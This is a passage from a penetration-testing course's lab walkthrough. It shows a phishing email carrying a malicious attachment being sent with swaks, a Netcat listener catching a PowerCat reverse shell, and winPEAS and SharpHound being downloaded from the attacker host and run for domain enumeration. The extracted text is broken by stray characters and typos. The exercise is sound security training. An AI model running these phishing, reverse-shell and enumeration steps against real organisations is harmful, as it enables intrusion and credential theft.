kali@kali:~/beyond$ cp /usr/share/powershell-
empire/empire/server/data/module_source/management/powercat.ps1 .
kali@kali:~/beyond$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
Listing 901 - Serving powercat.ps1 on port 8000 via Python3 web server
Once the Python3 web server is running, we can start a Netcat listener on port 4444 in a new
terminal tab to catch the incoming reverse shell from PowerCat.
kali@kali:~/beyond$ nc -nvlp 4444
listening on [any] 4444 ...
Listing 902 - Listening on port 4444 with Netcat
With Netcat running, all services and files are prepared. Now, let’s create the email.
We could also use the WebDAV share to serve Powercat instead of the Python3
web server. However, serving the file via another port provides us additional
flexibility.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 829
Made in Morocco
Penetration Testing with Kali Linux
To send the email, we’ll use the command-line SMTP test tool swaks.1197 As a first step, let’s
create the body of the email containing our pretext. Because we don’t have specific information
about any of the users, we have to use something more generic. Fortunately, we obtained some
information about the target company on WEBSRV1 within the Git repository.
Including information only known to employees or staff will tremendously
increase our chances that an attachment is opened.
We’ll create the body.txt file in /home/kali/beyond with the following text:
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists
y
in the Git logs. I'll remove it for security reasons.
On an unrelated note, please install the new security fekatures on your workstation.
For this, download the attached file, double-click on it, and execute the
configuration shortcut within. Thanks!
s
John
o
Hopefully this text will convince marcus or daniela to open our attachment.
n
In a real assessment we should also use passive information gathering
techniques to obtain more iniformation about a potential target. Based on this
information, we could create more tailored emails and improve our chances of
z
success tremendously.
D
Now we are ready to build the swaks command to send the emails. We’ll provide
PI:EMAIL and PI:EMAIL as recipients of the email to -t,
PI:EMAIL as name on the email envelope (sender) to --from, and the Windows Library
file to --attach. Next, we’ll enter --suppress-data to summarize information regarding the SMTP
transactions. For the email subject and body, we’ll provide Subject: Staging Script to --header and
body.txt to --body. In addition, we’ll enter the IP address of MAILSRV1 for --server. Finally, we’ll add
-ap to enable password authentication.
The complete command is shown in the following listing. Once entered, we have to provide the
credentials of john:
kali@kali:~/beyond$ sudo swaks -t PI:EMAIL -t PI:EMAIL --from
PI:EMAIL --attach @config.Library-ms --server 192.168.50.242 --body @body.txt -
-header "Subject: Staging Script" --suppress-data -ap
Username: john
Password: dqsTwTpZPn#nL
=== Trying 192.168.50.242:25...
=== Connected to 192.168.50.242.
1197 (Jetmore, 2022), http://www.jetmore.org/john/code/swaks/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 830
Made in Morocco
Penetration Testing with Kali Linux
 EHLO kali
 AUTH LOGIN
 am9obg==
 ZHFzVHdUcFpQbiNuTA==
 MAIL FROM:
 RCPT TO:
 DATA
 36 lines sent k
 QUIT
s
Listing 904 - Incoming reverse shell on port 4444
Great! Listing 904 shows that our client-side attack via email was successful and we obtained an
interactive shell on a machine.
Let’s display the current user, hostname, and IP address to confirm that we have an initial
foothold in the internal network.
PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
whoami
beyond\marcus
PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
hostname
CLIENTWK1
PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig
ipconfig
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 831
Made in Morocco
Penetration Testing with Kali Linux
Windows IP Configuration
Ethernet adapter Ethernet0:
Connection-specific DNS Suffix . :
IPv4 Address. . . . . . . . . . . : 172.16.6.243
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 172.16.6.254
PS C:\Windows\System32\WindowsPowerShell\v1.0>
Listing 905 - Obtaining basic information about the target machine
Listing 905 shows that we landed on the CLIENTWK1 system as domain user marcus. In addition,
the IP address of the system is 172.16.6.243/24, indicating an internal IP range. We should also
document the IP address and network information, such as the subnet and gateway in our
workspace directory. y
Let’s briefly summarize what we did in this section. First, we set up our Kali machine to provide
k
the necessary services and files for our attack. Then, we prepared a Windows Library and
shortcut file on WINPREP. Once we sent our email with the attachment, we received an incoming
reverse shell from CLIENTWK1 in the internal network. s
24.4 Enumerating the Internal Netowork
This Learning Unit covers the following Learning Objectives:
n
• Gain situational awareness in a network
• Enumerate hosts, services, andi sessions in a target network
z
• Identify attack vectors in a target network
In the previous Learning DUnit, we obtained an initial foothold on the CLIENTWK1 machine.
Because we have no information about the local system or the internal network yet, we have to
gather information on both. We’ll first enumerate CLIENTWK1 and then the Active Directory
environment. Our goal is to identify potential lateral movement vectors or ways to elevate our
privileges.
24.4.1 Situational Awareness
In this section, we’ll attempt to gain situational awareness on the CLIENTWK1 system and the
internal network. First, we’ll perform local enumeration on CLIENTWK1 to obtain an overview of
the system and identify potentially valuable information and data. Then, we’ll enumerate the
domain to discover users, computers, domain administrators, and potential vectors for lateral
movement and privilege escalation.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 832
Made in Morocco
Penetration Testing with Kali Linux
For this Learning Unit, we’ll not explicitly store every result in our workspace
directory on Kali. However, to get used to the documenting process you should
create notes of all findings and information while following along.
Let’s start with enumerating the CLIENTWK1 machine. Let’s copy the 64-bit winPEAS executable
to the directory served by the Python3 web server. On CLIENTWK1, we’ll change the current
directory to the home directory for marcus and download winPEAS from our Kali machine. Once
downloaded, we’ll launch it.
PS C:\Windows\System32\WindowsPowerShell\v1.0> cd C:\Users\marcus
cd C:\Users\marcus y
PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile
winPEAS.exe k
iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe
s
PS C:\Users\marcus> .\winPEAS.exe
.\winPEAS.exe
... o
Listing 906 - Downloading and executing winPEAS
Let’s review some of the results providned by winPEAS. We’ll start with the Basic System
Information section.
Basic System Informaition
 Check if the Windows versionzs is vulnerable to some known exploit
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-
escalation#kernel-exploits
D
Hostname: CLIENTWK1
Domain Name: beyond.com
ProductName: Windows 10 Pro
EditionID: Professional
Listing 907 - Basic System Information
Listing 907 shows that winPEAS detected CLIENTWK1’s operating system as Windows 10 Pro.
As we have learned in the course, winPEAS may falsely detect Windows 11 as Windows 10, so
let’s manually check the operating system with systeminfo.
PS C:\Users\marcus> systeminfo
systeminfo
Host Name: CLIENTWK1
OS Name: Microsoft Windows 11 Pro
OS Version: 10.0.22000 N/A Build 22000
Listing 908 - Operating System Information
Indeed, Windows 11 is the operating system on CLIENTWK1. If we had blindly relied on the
winPEAS results, we may have made the wrong assumptions from the beginning.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 833
Made in Morocco
Penetration Testing with Kali Linux
With experience, a penetration tester will develop a sense for which information
from automated tools should be double-checked.
Going back to review the winPEAS output, we come across the AV section.
AV Information
[X] Exception: Object reference not set to an instance of an object.
No AV was detected!!
Not Found
Listing 909 - AV Information
No AV has been detected. This will make the use of other tools and pyayloads such as Meterpreter
much easier.
k
Let’s also review the network information such as Network Ifaces and known hosts and DNS
cached.
s
Network Ifaces and known hosts
 The masks are only for the IPv4 addresses
o
Ethernet0[00:50:56:8A:0F:27]: 172.16.6.243 / 255.255.255.0
Gateways: 172.16.6.254
DNSs: 172.16.6.240
n
Known hosts:
169.254.255.255 00-00-00-00-00-00 Invalid
172.16.6.240 00-50-56-8A-08-34 Dynamic
i
172.16.6.254 00-50-56-8A-DA-71 Dynamic
z
172.16.6.255 FF-FF-FF-FF-FF-FF Static
...
D
DNS cached --limit 70--
Entry Name Data
dcsrv1.beyond.com DCSRV1.beyond.com
172.16.6.240
mailsrv1.beyond.com mailsrv1.beyond.com
172.16.6.254
Listing 910 - Network Interfaces, Known hosts, and DNS Cache
Listing 910 shows that the DNS entries for mailsrv1.beyond.com (172.16.6.254) and
dcsrv1.beyond.com (172.16.6.240) are cached on CLIENTWK1. Based on the name, we can
assume that DCSRV1 is the domain controller of the beyond.com domain.
Furthermore, because MAILSRV1 is detected with the internal IP address of 172.16.6.254 and we
enumerated the machine from an external perspective via 192.168.50.242, we can safely assume
that this is a dual-homed host.
As we did for credentials, let’s create a text file named computer.txt in /home/kali/beyond/ to
document identified internal machines and additional information about them.
kali@kali:~/beyond$ cat computer.txt
172.16.6.240 - DCSRV1.BEYOND.COM
-> Domain Controller
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 834
Made in Morocco
Penetration Testing with Kali Linux
172.16.6.254 - MAILSRV1.BEYOND.COM
-> Mail Server
-> Dual Homed Host (External IP: 192.168.50.242)
172.16.6.243 - CLIENTWK1.BEYOND.COM
-> User _marcus_ fetches emails on this machine
Listing 911 - List containing the most important information about identified target machines
Reviewing the rest of the winPEAS results, we don’t find any actionable information to attempt a
potential privilege escalation attack. However, we should remind ourselves that we are in a
simulated penetration test and not in a CTF lab environment. Therefore, it is not necessary to get
administrative privileges on every machine.
y
While we skipped over most of the winPEAS results, we should examine the
results thoroughly as we would in a real penetration test. After the local
k
enumeration of the system, we should have obtained key pieces of information,
which we listed in the Situational Awareness section of the Windows Privilege
Escalation Module. s
o
Since we haven’t identified a privilege escalation vector via winPEAS and there is nothing else
actionable on the system, such as a Password Manager, let’s start enumerating the AD
n
environment and its objects.
We learned several techniques in this course to perform this kind of enumeration. For this
i
Module, we’ll use BloodHound with the SharpHound.ps1 collector, which we discussed in the
z
Active Directory Introduction and Enumeration Module.
First, we’ll copy the PowerSDhell collector to /home/kali/beyond in a new terminal tab to serve it via
the Python3 web server on port 8000.
kali@kali:~/beyond$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
Listing 912 - Copying SharpHound collector to the beyond directory
Since our Python3 web server is still running on port 8000, we can download the PowerShell
script on the target machine and import it in a newly spawned PowerShell session with the
ExecutionPolicy set to Bypass.
PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile
SharpHound.ps1
iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
PS C:\Users\marcus> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows
PS C:\Users\marcus> . .\SharpHound.ps1
. .\SharpHound.ps1
Listing 913 - Downloading and importing the PowerShell BloodHound collector
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 835
Made in Morocco
Penetration Testing with Kali Linux
Now, we can execute Invoke-BloodHound by providing All to -CollectionMethod to invoke all
available collection methods.
PS C:\Users\marcus> Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -CollectionMethod All
2022-10-10T07:24:34.3593616-07:00|INFORMATION|This version of SharpHound is compatible
with the 4.2 Release of BloodHound